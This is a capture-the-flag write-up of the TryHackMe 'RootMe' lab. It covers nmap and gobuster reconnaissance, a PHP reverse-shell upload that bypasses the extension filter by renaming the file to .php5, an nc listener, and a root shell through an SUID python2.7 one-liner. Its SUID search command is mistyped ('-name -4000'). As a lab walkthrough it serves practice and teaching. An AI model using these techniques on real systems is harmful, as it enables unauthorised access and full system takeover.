# 🧪 RootMe Lab Writeup

## 📌 Overview

This lab covers:

* Reconnaissance
* Gaining initial access
* Privilege escalation

<img width="1042" height="629" alt="12 success" src="https://github.com/user-attachments/assets/45e26ce3-3358-42df-b257-0b4b22b680bc" />

---

# 🔍 Task 2: Reconnaissance

## Step 1: Port Scanning

We scanned the target using:

```bash
nmap -sV <Target-IP>
```

<img width="944" height="506" alt="1 scan" src="https://github.com/user-attachments/assets/8d53cbaa-d1f2-4824-9a11-7a52c7b819b5" />

### 📊 Results:

* Port 22 → OpenSSH 8.2p1
* Port 80 → Apache httpd 2.4.41

### ✅ Questions Solved:

* Scan the machine, how many ports are open? → **2**
* What version of Apache is running? → **2.4.41**
* What service is running on port 22? → **SSH**

---

## Step 2: Web Enumeration

Navigating to:

```
http://<Target-IP>
```

We get the homepage.

<img width="1599" height="867" alt="2 port-80" src="https://github.com/user-attachments/assets/67167e07-3d57-4b04-b5c3-a2fa6cffa301" />

Directory brute-forcing:

```bash
gobuster dir -u http://<Target-IP> -w /usr/share/wordlists/dirb/common.txt
```

<img width="1076" height="704" alt="3 panel-port-80" src="https://github.com/user-attachments/assets/b434f682-0f68-4414-b3e1-102e3f638028" />

### 📂 Interesting Directories Found:

* `/Hidden1` → File upload page 
* `/Hidden2` → Contains uploaded files

### ✅ Questions Solved:

* Find directories on the web server using the GoBuster tool → **No answer needed**
* What is the hidden directory? → **/Hidden1**

---

# 💻 Task 3: Getting a Shell

Navigated to:

```
http://<Target-IP>/Hidden1
```

Upload functionality is available.

We used a PHP reverse shell (pentestmonkey).

<img width="1110" height="783" alt="4 php" src="https://github.com/user-attachments/assets/1293ab17-df5c-4d24-bf7a-05304a25f9a9" />

### ❌ Issue:

```
PHP extension not allowed
```

<img width="612" height="636" alt="5 php-not-allowed" src="https://github.com/user-attachments/assets/e014c185-d416-471e-b765-e382c2eb91c0" />

### ✅ Bypass:

Rename file:

```
php-reverse-shell.php → php-reverse-shell.php5
```

Upload succeeds.

<img width="603" height="668" alt="6 success" src="https://github.com/user-attachments/assets/012e74f1-4ec7-4332-9d71-b294fdec76e6" />

---

## Step 2: Start Listener

```bash
nc -nvlp 4444
```

<img width="718" height="354" alt="7 listen" src="https://github.com/user-attachments/assets/4c1b0469-4b70-4b91-bda6-72936304801c" />

---

## Step 3: Trigger Shell

Navigate to:

```
http://<Target-IP>/Hidden2
```

Click on:

```
php-reverse-shell.php5
```

<img width="633" height="343" alt="8 uploads" src="https://github.com/user-attachments/assets/1c8e32d3-799d-44fb-adbc-40dd297fa795" />

### 🎯 Result:

Reverse shell obtained.

<img width="787" height="487" alt="9 success-rsh" src="https://github.com/user-attachments/assets/73bf0a50-38e0-4e37-b35b-8fbac0845270" />

---

## Step 4: Find User Flag

```bash
find / -name user.txt 2>/dev/null
```

Output:

```
/var/www/user.txt
```

```bash
cat /var/www/user.txt
```

<img width="782" height="472" alt="10 user-flag" src="https://github.com/user-attachments/assets/bb2549e8-15a9-4e65-b4e8-08d5fdb9ded3" />

### ✅ Question Solved:

* user.txt → **THM{xyz}**

---

# 🔐 Task 4: Privilege Escalation

## Step 1: Find SUID Files

```bash
find / -name -4000 2>/dev/null
```

<img width="480" height="315" alt="11 sudo-permision" src="https://github.com/user-attachments/assets/436389b4-d8f4-44f1-86f5-0f78dacfca9b" />

### 📌 Interesting Finding:

```
/usr/bin/python2.7
```

### ✅ Question Solved:

* Search for files with SUID permission, which file is weird? → **/usr/bin/python2.7**

---

## Step 2: Exploit SUID Python

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 🎯 Result:

Root shell obtained.

---

## Step 3: Find Root Flag

```bash
find / -name root.txt 2>/dev/null
```

Output:

```
/root/root.txt
```

```bash
cat /root/root.txt
```

<img width="688" height="135" alt="12 1 root-flag" src="https://github.com/user-attachments/assets/b487d555-e76d-44b1-baa6-554796253840" />

### ✅ Questions Solved:

* Find a form to escalate your privileges → **No answer needed**
* root.txt → **THM{abc}**

---

# 🏁 Conclusion

* Successfully enumerated services
* Exploited file upload vulnerability
* Gained reverse shell
* Escalated privileges using SUID Python binary
* Captured both user and root flags



